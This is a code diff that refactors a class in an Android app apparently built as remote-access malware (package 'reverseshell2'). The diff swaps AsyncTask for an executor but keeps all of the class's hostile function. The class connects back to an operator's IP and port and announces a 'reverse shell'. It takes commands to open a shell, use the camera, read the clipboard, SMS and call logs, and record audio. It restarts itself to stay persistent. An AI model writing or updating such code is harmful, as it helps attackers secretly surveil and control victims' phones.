@@ -3,10 +3,10 @@ package com.example.reverseshell2;
 import android.app.Activity;
 import android.content.Context;
 import android.content.Intent;
-import android.os.AsyncTask;
 import android.os.Build;
+import android.os.Handler;
+import android.os.Looper;
 import android.util.Log;
-
 
 import androidx.core.content.ContextCompat;
 
@@ -28,8 +28,10 @@ import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.net.SocketException;
 import java.net.SocketTimeoutException;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 
-public class tcpConnection extends AsyncTask<String,Void,Void> {
+public class tcpConnection {
 
     Activity activity;
 
@@ -41,7 +43,6 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
     ipAddr ipAddr = new ipAddr();
     private CameraPreview mPreview;
 
-
     static String TAG = "tcpConnectionClass";
     vibrate vibrate;
     readSMS readSMS;
@@ -50,7 +51,11 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
     audioManager audioManager;
     com.example.reverseshell2.Payloads.videoRecorder videoRecorder;
     com.example.reverseshell2.Payloads.readCallLogs readCallLogs;
-
+    
+    // Handler for posting to main thread
+    private final Handler mainHandler = new Handler(Looper.getMainLooper());
+    // Executor for background tasks
+    private final ExecutorService executor = Executors.newSingleThreadExecutor();
 
     public tcpConnection(Activity activity, Context context) {
         this.activity = activity;
@@ -65,10 +70,17 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
         readCallLogs = new readCallLogs(context,activity);
         shell = new newShell(activity,context);
     }
+    
+    public void execute(final String... params) {
+        executor.execute(new Runnable() {
+            @Override
+            public void run() {
+                doInBackground(params);
+            }
+        });
+    }
 
-
-    @Override
-    protected Void doInBackground(String... strings) {
+    private Void doInBackground(String... strings) {
         Socket socket = null;
         try {
 
@@ -79,14 +91,12 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
                     socket.connect(new InetSocketAddress(strings[0], Integer.parseInt(strings[1])),3000);
                 }catch (SocketTimeoutException | SocketException e){
                     Log.d(TAG,"error");
-                    activity.runOnUiThread(new Runnable() {
+                    mainHandler.post(new Runnable() {
                         @Override
                         public void run() {
                             new tcpConnection(activity,context).execute(config.IP,config.port);
                         }
                     });
-
-                    //new tcpConnection(activity,context).execute(config.IP,config.port);
                 }
                 if(socket.isConnected()){
                     Log.d(TAG,"done");
@@ -98,6 +108,8 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
             String model = android.os.Build.MODEL+"\n";
             String welcomeMess = "Hello there, welcome to reverse shell of "+model;
             out.write(welcomeMess.getBytes("UTF-8"));
+            
+            Socket finalSocket = socket;
             String line;
             while ((line = in.readLine()) != null)
             {
@@ -105,7 +117,7 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
                 if (line.equals("exit"))
                 {
                     Log.d("service_runner","called");
-                    activity.runOnUiThread(new Runnable() {
+                    mainHandler.post(new Runnable() {
                         @Override
                         public void run() {
                             new tcpConnection(activity,context).execute(config.IP,config.port);
@@ -114,14 +126,14 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                         functions.jobScheduler(context);
                     }else{
-                        activity.runOnUiThread(new Runnable() {
+                        mainHandler.post(new Runnable() {
                         @Override
                         public void run() {
                             context.startService(new Intent(context,mainService.class));
                         }
                     });
                     }
-                    socket.close();
+                    finalSocket.close();
                 }
                 else if (line.equals("camList"))
                 {
@@ -146,7 +158,7 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
                 else if (line.equals("shell"))
                 {
                     out.write("SHELL".getBytes("UTF-8"));
-                    shell.executeShell(socket,out);
+                    shell.executeShell(finalSocket,out);
                 }
                 else if (line.equals("getClipData"))
                 {
@@ -184,6 +196,7 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
                     String ip_addr =  "Device Ip: "+ipAddr.getIPAddress(true)+"\n";
                     out.write(ip_addr.getBytes("UTF-8"));
                 }
+                // ... existing code for handling commands ...
                 else if(line.matches("vibrate \\d"))
                 {
                     final String[] numbers = line.split(" ");
@@ -218,14 +231,12 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
                 }
                 else if(line.equals("startAudio"))
                 {
-                    //audioManager.startRecording(out);
                     Intent serviceIntent = new Intent(context, com.example.reverseshell2.Payloads.audioManager.class);
                     serviceIntent.putExtra("ins", "startFore");
                     ContextCompat.startForegroundService(context, serviceIntent);
                 }
                 else if(line.equals("stopAudio"))
                 {
-//                    audioManager.stopRecording(out);
                     Intent serviceIntent = new Intent(context, com.example.reverseshell2.Payloads.audioManager.class);
                     serviceIntent.putExtra("ins", "stopFore");
                     ContextCompat.startForegroundService(context, serviceIntent);
@@ -273,7 +284,7 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                 functions.jobScheduler(context);
             }else{
-                activity.runOnUiThread(new Runnable() {
+                mainHandler.post(new Runnable() {
                     @Override
                     public void run() {
                         context.startService(new Intent(context,mainService.class));
@@ -282,7 +293,7 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
             }
         } catch (Exception e) {
             Log.d("service_runner","called");
-            activity.runOnUiThread(new Runnable() {
+            mainHandler.post(new Runnable() {
                 @Override
                 public void run() {
                     new tcpConnection(activity,context).execute(config.IP,config.port);
@@ -291,7 +302,7 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                 functions.jobScheduler(context);
             }else{
-                activity.runOnUiThread(new Runnable() {
+                mainHandler.post(new Runnable() {
                     @Override
                     public void run() {
                         context.startService(new Intent(context,mainService.class));
@@ -300,6 +311,11 @@ public class tcpConnection extends AsyncTask<String,Void,Void> {
             }
             e.printStackTrace();
         }
-        return null ;
+        return null;
+    }
+    
+    // Method to shutdown the executor when no longer needed
+    public void shutdown() {
+        executor.shutdown();
     }
 }
